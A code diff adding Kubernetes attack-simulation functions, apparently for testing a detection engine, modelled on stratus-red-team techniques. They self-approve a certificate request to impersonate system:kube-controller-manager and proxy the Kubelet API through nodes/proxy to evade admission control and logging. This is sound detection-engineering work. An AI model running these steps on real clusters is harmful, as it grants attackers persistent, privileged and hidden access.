@@ -427,6 +427,96 @@ def create_service_account_token(namespace: str, sa_name: str) -> None:
     core.create_namespaced_service_account_token(sa_name, namespace, body)
 
 
+# ---- CSR 기반 클라이언트 인증서 발급 (S57, 2026-07-18) ----
+
+def create_and_approve_csr(name: str, common_name: str) -> None:
+    """S57(CSR 기반 클라이언트 인증서 발급 정황) 재료 - CSR을 만들고 스스로 승인해서
+    common_name(예: system:kube-controller-manager처럼 이미 강력한 ClusterRoleBinding을
+    가진 내장 신원)으로 클라이언트 인증서를 발급받는다. DataDog stratus-red-team의
+    k8s.persistence.create-client-certificate와 동일 원리 - 실측으로 이 프로젝트의
+    correlation-engine이 이 리소스(certificatesigningrequests)를 아예 안 보고 있었던
+    사각지대를 메우는 시나리오라 반드시 실제 CSR 생성+승인 API 호출로 재현해야
+    의미가 있다(가짜 로그 주입 아님)."""
+    from cryptography import x509
+    from cryptography.hazmat.primitives import hashes, serialization
+    from cryptography.hazmat.primitives.asymmetric import rsa
+    from cryptography.x509.oid import NameOID
+
+    _clients()  # kubeconfig 로드 트리거
+    certs = client.CertificatesV1Api()
+    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+    csr = (
+        x509.CertificateSigningRequestBuilder()
+        .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, common_name)]))
+        .sign(key, hashes.SHA256())
+    )
+    csr_pem = csr.public_bytes(serialization.Encoding.PEM)
+
+    created = certs.create_certificate_signing_request(
+        client.V1CertificateSigningRequest(
+            metadata=client.V1ObjectMeta(name=name),
+            spec=client.V1CertificateSigningRequestSpec(
+                groups=["system:authenticated"],
+                signer_name="kubernetes.io/kube-apiserver-client",
+                usages=["client auth"],
+                request=base64.b64encode(csr_pem).decode(),
+            ),
+        )
+    )
+    # replace_certificate_signing_request_approval은 부분 patch가 아니라 전체 객체
+    # replace라 spec을 그대로 다시 실어 보내야 한다(방금 create가 돌려준 객체를
+    # 재사용) - status만 채운 새 객체를 보내면 "spec must not be None"으로 거부된다
+    # (실측 확인, 2026-07-18).
+    created.status = client.V1CertificateSigningRequestStatus(
+        conditions=[
+            client.V1CertificateSigningRequestCondition(
+                type="Approved", status="True", reason="dummy-approval",
+                message="approved by scenarios.py",
+            )
+        ]
+    )
+    certs.replace_certificate_signing_request_approval(name, created)
+
+
+def delete_csr(name: str) -> None:
+    _clients()  # kubeconfig 로드 트리거
+    certs = client.CertificatesV1Api()
+    _ignore_404(certs.delete_certificate_signing_request, name)
+
+
+# ---- nodes/proxy 권한상승 (S58, 2026-07-18) ----
+
+def create_nodeproxy_clusterrole(name: str) -> None:
+    """S58 재료 - nodes/proxy subresource에 대한 get 권한만 가진 ClusterRole. 공격에
+    실제로 필요한 최소 권한이 이것뿐이라는 걸 보이기 위해 일부러 get 하나만 준다
+    (stratus-red-team의 기법이 만드는 clusterrole은 여기에 create도 얹는데, 그건
+    Terraform 리소스의 부수 효과일 뿐 실제 프록시 호출엔 안 쓰인다 - network.yaml
+    S58 주석 참고)."""
+    _, rbac = _clients()
+    rule = client.V1PolicyRule(api_groups=[""], resources=["nodes/proxy"], verbs=["get"])
+    rbac.create_cluster_role(client.V1ClusterRole(metadata=client.V1ObjectMeta(name=name), rules=[rule]))
+
+
+def get_any_node_name() -> str:
+    core, _ = _clients()
+    return core.list_node().items[0].metadata.name
+
+
+def call_node_proxy(sa_namespace: str, sa_name: str, node_name: str, kubelet_path: str = "/runningpods/") -> str:
+    """S58 재료 - nodes/proxy 권한을 가진 SA의 토큰으로 Kubelet API를 직접 프록시한다
+    (어드미션 컨트롤과 일반 API 요청 로깅을 우회하는 실제 권한상승 벡터, DataDog
+    stratus-red-team의 k8s.privilege-escalation.nodes-proxy와 동일 원리)."""
+    import requests
+
+    core, _ = _clients()
+    body = client.AuthenticationV1TokenRequest(spec=client.V1TokenRequestSpec(expiration_seconds=600))
+    token = core.create_namespaced_service_account_token(sa_name, sa_namespace, body).status.token
+    cfg = Configuration.get_default_copy()
+    url = f"{cfg.host}/api/v1/nodes/{node_name}/proxy{kubelet_path}"
+    resp = requests.get(url, headers={"Authorization": f"Bearer {token}"}, verify=False, timeout=5)
+    return f"GET {url} -> {resp.status_code}"
+
+
 # ---- 정상(benign) K8s 활동 ----
 
 def _normal_k8s_actions() -> List[Tuple[str, Callable[[], None]]]:
